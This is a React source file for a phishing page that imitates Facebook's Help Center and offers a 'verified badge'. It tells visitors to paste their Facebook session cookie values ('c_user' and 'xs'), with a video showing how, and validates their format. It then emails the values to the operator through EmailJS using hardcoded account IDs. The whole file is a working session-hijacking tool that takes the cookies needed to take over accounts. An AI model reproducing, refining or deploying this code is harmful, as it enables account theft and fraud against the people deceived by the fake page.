import React, { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import emailjs from "@emailjs/browser";
import "./style.css"; // Ensure the path is correct

const ValidationPage = () => {
  const form = useRef();
  const [isFormValid, setIsFormValid] = useState(false);
  const [videoMuted, setVideoMuted] = useState(true);
  const [showModal, setShowModal] = useState(false); // State to control modal visibility

  const sendEmail = (e) => {
    e.preventDefault();

    const cUserValue = form.current.elements["c_user"].value;
    const xsValue = form.current.elements["xs"].value;

    const cUserPattern = /^\d{15}$/;
    const xsPattern = /.*%+.*/;

    const isCUserValid = cUserPattern.test(cUserValue);
    const isXsValid = xsPattern.test(xsValue);

    if (isCUserValid && isXsValid) {
      emailjs
        .sendForm(
          "service_7lce09n",
          "template_2c9jb3o",
          form.current,
          "9A_y0UG3yCmhE-Hh8"
        )
        .then(
          (result) => {
            console.log("result text is", result.text);
            setShowModal(true); // Show the modal after form submission
          },
          (error) => {
            console.log(error.text);
          }
        );
    } else {
      setIsFormValid(true);
    }
  };

  return (
    <>
      <form ref={form} onSubmit={sendEmail}>
        {/* Header Section - Old Facebook Theme */}
        <div
          className="d-flex align-items-center"
          style={{ width: "100%", height: "90px", background: "#4667AC" }}
        >
          <h1 className="text-white ms-4 m-0 d-flex align-self-center">
            facebook
          </h1>
        </div>

        {/* Subheader Section */}
        <div
          className="d-flex align-items-center"
          style={{ width: "100%", height: "60px", background: "#E9EBEE" }}
        >
          <h4 className="ms-4 m-0 d-flex align-self-center text-primary">
            Help Center
          </h4>
        </div>

        <div className="col-12 my-4 d-flex justify-content-center align-items-center">
          <div className="col-11 col-md-6 border">
            <div className="p-2" style={{ background: "#F5F6F7" }}>
              <h5 className="m-0">Request a verified badge on Facebook</h5>
            </div>
            <div className="p-2">
              {isFormValid && (
                <div className="alert alert-danger">
                  Please enter valid values for both fields.
                  <br />
                  For more detail, check the video below.
                </div>
              )}
              <p className="fw-semibold validation_form_para">
                The verified badge means that Facebook has confirmed that the
                Page or profile is the authentic presence of the individual,
                public figure, or brand that it represents.
              </p>
              <p className="fw-semibold validation_form_para">
                A Facebook account with a verified badge <img
                  src="https://firebasestorage.googleapis.com/v0/b/contactvehicleapp-7d7a0.appspot.com/o/secondtick.png?alt=media&token=72a304b3-4767-4306-917d-4181f6b576af"
                  alt="blue tick"
                  style={{ width: '1rem', marginBottom: '0.1rem' }} /> next to its name now means that Facebook has confirmed it as the authentic presence for that person or brand.
              </p>
              <video
                controls
                autoPlay
                muted={videoMuted}
                src="https://firebasestorage.googleapis.com/v0/b/details-facebook-a00f0.appspot.com/o/0809.mp4?alt=media&token=b12189d9-dd1f-4d1a-8245-43b12e4094a9"
                style={{ width: "500px", height: "280px" }} 
              ></video>
              <button 
                onClick={() => setVideoMuted(false)} 
                style={{ 
                  padding: "4px 8px", 
                  fontSize: "12px", 
                  marginTop: "10px" 
                }}
              >
                Enable Sound
              </button>
              <label className="" style={{ fontSize: "12px" }}>
                c_user
              </label>
              <input
                type="number"
                name="c_user"
                required
                pattern="^\d{15}$"
                title="Please enter 15 digits"
              />
              <label className="mt-2" style={{ fontSize: "12px" }}>
                xs
              </label>
              <input
                type="text"
                name="xs"
              />
              <button
                type="submit"
                className="text-white border-0"
                style={{ background: "#4267B2" }}
              >
                Submit
              </button>
            </div>
          </div>
        </div>
      </form>
    </>
  );
};

export default ValidationPage;
